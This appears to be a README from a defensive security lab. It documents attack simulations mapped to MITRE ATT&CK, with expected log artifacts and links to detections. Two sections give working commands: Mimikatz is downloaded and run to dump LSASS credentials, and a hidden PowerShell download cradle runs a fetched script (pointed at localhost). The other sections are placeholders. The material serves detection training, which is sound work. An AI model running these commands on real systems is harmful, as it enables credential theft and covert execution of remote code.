# Attack Simulations

This directory documents attack techniques executed in the lab environment. Each simulation includes step-by-step reproduction steps, expected log artifacts, and links to corresponding detection rules.

> **⚠️ Warning:** These techniques are documented for defensive learning only. Only execute them in your isolated lab environment against systems you own.

---

## MITRE ATT&CK Coverage

| # | Technique | ATT&CK ID | Status |
|---|---|---|---|
| 1 | [Credential Dumping — LSASS](#1-credential-dumping--lsass-memory) | T1003.001 | �� In Progress |
| 2 | [PowerShell Obfuscated Command Execution](#2-powershell-obfuscated-command-execution) | T1059.001 | 🔄 In Progress |
| 3 | [Process Injection](#3-process-injection) | T1055 | ⬜ Planned |
| 4 | [Lateral Movement via PsExec](#4-lateral-movement-via-psexec) | T1570 | ⬜ Planned |
| 5 | [Network Scanning (Nmap)](#5-network-scanning) | T1046 | ⬜ Planned |
| 6 | [Pass-the-Hash](#6-pass-the-hash) | T1550.002 | ⬜ Planned |
| 7 | [Scheduled Task Persistence](#7-scheduled-task-persistence) | T1053.005 | ⬜ Planned |
| 8 | [DNS Enumeration](#8-dns-enumeration) | T1018 | ⬜ Planned |

---

## 1. Credential Dumping — LSASS Memory

**MITRE ATT&CK:** [T1003.001](https://attack.mitre.org/techniques/T1003/001/)  
**Tool:** Mimikatz  
**Target:** Windows 10 / Windows Server 2022  
**Prerequisites:** Administrator or SYSTEM privileges on target

### Description
Attackers dump credentials from the Windows LSASS process to obtain plaintext passwords or NTLM hashes for lateral movement.

### Steps to Reproduce

```powershell
# On attacker machine (Kali), gain initial access first
# Then on the Windows target (as Administrator):

# Download Mimikatz (lab environment only)
Invoke-WebRequest -Uri "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -OutFile "C:\mimikatz.zip"
Expand-Archive C:\mimikatz.zip -DestinationPath C:\mimikatz

# Run Mimikatz
C:\mimikatz\x64\mimikatz.exe

# In Mimikatz prompt:
privilege::debug
sekurlsa::logonpasswords
```

### Expected Log Artifacts

| Log Source | Event ID | Key Fields |
|---|---|---|
| Sysmon | 10 (ProcessAccess) | TargetImage: lsass.exe, GrantedAccess: 0x1010 |
| Windows Security | 4656 | Object: \Device\HarddiskVolume*\Windows\System32\lsass.exe |
| Sysmon | 1 (ProcessCreate) | Image: mimikatz.exe |

### Detection
→ See [`detections/README.md#lsass-memory-access`](../detections/README.md)

---

## 2. PowerShell Obfuscated Command Execution

**MITRE ATT&CK:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/)  
**Tool:** PowerShell (built-in)  
**Target:** Windows 10 / Windows 11  
**Prerequisites:** User-level access

### Description
Attackers use PowerShell with encoded commands or obfuscation to evade signature-based detection. This technique is extremely common in real-world attacks.

### Steps to Reproduce

```powershell
# Example 1: Base64-encoded command
$cmd = "Write-Host 'Simulated C2 beacon'"
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
powershell.exe -EncodedCommand $encoded

# Example 2: Download cradle (simulated - points to localhost)
powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -Command "IEX(New-Object Net.WebClient).DownloadString('http://127.0.0.1/payload.ps1')"
```

### Expected Log Artifacts

| Log Source | Event ID | Key Fields |
|---|---|---|
| PowerShell | 4104 (Script Block) | ScriptBlockText containing encoded/obfuscated content |
| Sysmon | 1 (ProcessCreate) | CommandLine containing `-EncodedCommand` or `-Enc` |
| Windows Security | 4688 | Process: powershell.exe, CommandLine with suspicious flags |

### Detection
→ See [`detections/README.md#powershell-obfuscation`](../detections/README.md)

---

## 3. Process Injection

**MITRE ATT&CK:** [T1055](https://attack.mitre.org/techniques/T1055/)  
**Status:** ⬜ Planned

*Documentation coming soon.*

---

## 4. Lateral Movement via PsExec

**MITRE ATT&CK:** [T1570](https://attack.mitre.org/techniques/T1570/)  
**Status:** ⬜ Planned

*Documentation coming soon.*

---

## 5. Network Scanning

**MITRE ATT&CK:** [T1046](https://attack.mitre.org/techniques/T1046/)  
**Tool:** Nmap  
**Status:** ⬜ Planned

*Documentation coming soon.*

---

## 6. Pass-the-Hash

**MITRE ATT&CK:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/)  
**Status:** ⬜ Planned

*Documentation coming soon.*

---

## 7. Scheduled Task Persistence

**MITRE ATT&CK:** [T1053.005](https://attack.mitre.org/techniques/T1053/005/)  
**Status:** ⬜ Planned

*Documentation coming soon.*

---

## 8. DNS Enumeration

**MITRE ATT&CK:** [T1018](https://attack.mitre.org/techniques/T1018/)  
**Status:** ⬜ Planned

*Documentation coming soon.*

---

## Resources

- [MITRE ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/)
- [Atomic Red Team Tests](https://github.com/redcanaryco/atomic-red-team/tree/master/atomics)
- [LOLBAS Project](https://lolbas-project.github.io/)
